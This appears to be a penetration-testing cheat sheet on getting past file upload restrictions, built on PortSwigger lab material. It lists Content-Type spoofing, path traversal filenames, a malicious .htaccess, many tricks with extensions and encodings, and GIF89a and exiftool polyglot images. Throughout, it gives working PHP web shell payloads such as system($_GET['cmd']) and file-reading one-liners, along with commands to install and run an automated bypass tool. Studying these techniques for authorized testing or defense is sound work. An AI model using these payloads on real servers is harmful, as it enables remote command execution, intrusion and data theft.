# 🗃 File Upload Bypass

{% embed url="https://portswigger.net/web-security/file-upload" %}
Source
{% endembed %}

![File Upload Bypass Technique](<../../../.gitbook/assets/image (41).png>)

### Web shell Upload via **Content-Type restriction** Bypass

When uploading a .php file;

```bash
# Change :
# Content-Type: application/x-php
# to
# Content-Type: image/jpeg
```

### Web shell upload via path traversal

When uploading a php file; You can upload the file to a different directory with lesser controls (a different directory that's not supposed to contain user-supplied files)

```bash
# Change :
# Content-Disposition: form-data; name="avatar"; filename="secrets.php"
# to
# Content-Disposition: form-data; name="avatar"; filename="../secrets.php"

# You can encode "../" as :
    %2e%2e%2f
    %252e%252e%252f
    ..%c0%af
    ..%ef%bc%8f
# Then access the file with LFI :
# GET /files/avatars/../secrets.php
```

### Overriding the server configuration

Before uploading a php file;

* Servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings.
* Apache servers, for example, will load a directory-specific configuration from a file called **.htaccess** if one is present.

```php
# First, upload a malicious .htaccess :
# Content-Disposition: form-data; name="avatar"; filename=".htaccess"
# Content-Type: text/plain

# AddType application/x-httpd-php .l33t

# Then upload the php file with .l33t extention
# Content-Disposition: form-data; name="avatar"; filename="secrets.l33t"
# Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
# or
<?php system($_GET['cmd']); ?>
```

### Web Shell Upload Bypasses Techniques List

**According to OWASP the following list can be used by penetration testers in order to bypass a variety of protections :**

* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: **exploit%2Ephp**
* Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like **xC0 x2E, xC4 xAE or xC0 xAE** may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
* **Content-Type** —> Change the parameter in the request header using Burp, ZAP etc.
* Put **server executable extensions :** **.php5**, **.shtml**, **.asa**, **.cert**
* Changing letters to **capital** form : **.aSp**, **.PHp3**
* Using **trailing** **spaces** and/or **dots** at the end of the filename like **.asp.. . .... ...** , **.asp** , **.asp.**
* Use of **semicolon** after the forbidden extension and before the permitted extension : **.asp;.jpg** (_Only in IIS 6 or prior_)
* Upload a file with **2 extensions** —> **file.php.jpg**
* Use of **null** **character**—> **file.asp%00.jpg**
* Create a file with a **forbidden** **extension** —> **file.asp:.jpg** or **file.asp::$data**
* <mark style="color:red;">**ALSO : Combination of the above**</mark>

### Remote Code Execution via Polyglot web shell upload

In order to upload a php file where the file verification is done on the server side (checking if it is really a IMAGE file), we can **disguise a php file** **as an image file.**

When uploading a php file :

```php
# You can add :
GIF89a; // at the beginning of the php file or in the burp request

# Burp request
# Content-Disposition: form-data; name="avatar"; filename="secrets.php"
# Content-Type: application/x-php

# GIF89a at the beginning of the php command
GIF89a;<?php echo file_get_contents('/home/carlos/secret'); ?>
# OR
GIF89a;<?php system($_GET['cmd']); ?>
```

![PHP file disguised as an GIF file](<../../../.gitbook/assets/image (6) (1) (1) (1).png>)

or, Generate a polyglot payload using **exiftool :**

```bash
# example 1
exiftool -Comment="<?php echo 'START ' . 
file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

# example 2
exiftool -Comment="<?php echo 'START ' . 
system($_GET['cmd']); . ' END'; ?>" $input.jpg -o polyglot.php
```

## upload\_bypass

> File upload restrictions bypass by using different bug bounty techniques! Tool must be running with all its assets!

{% embed url="https://github.com/sAjibuu/upload_bypass" %}

### Install

```bash
git clone https://github.com/sAjibuu/upload_bypass.git
cd upload_bypass/
pip3 install -r requirements.txt

python3 ext_bypass.py -u $url -e $extension-file -a $allowed-extension -s $success-msg --location $path-of-uploaded-file
```

### PoC

{% embed url="https://www.youtube.com/watch?v=quFoDysbDto" %}
